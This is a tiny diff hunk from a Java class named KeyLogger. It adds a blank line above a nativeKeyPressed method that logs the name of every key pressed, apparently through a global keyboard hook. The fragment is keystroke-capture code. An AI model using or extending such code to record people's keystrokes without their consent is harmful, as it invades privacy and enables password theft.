@@ -47,6 +47,7 @@ public class KeyLogger implements NativeKeyListener {
 	/**
 	 * Overridden method to capture the pressed keys.
 	 */
+	
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
 		logger.info("Key pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
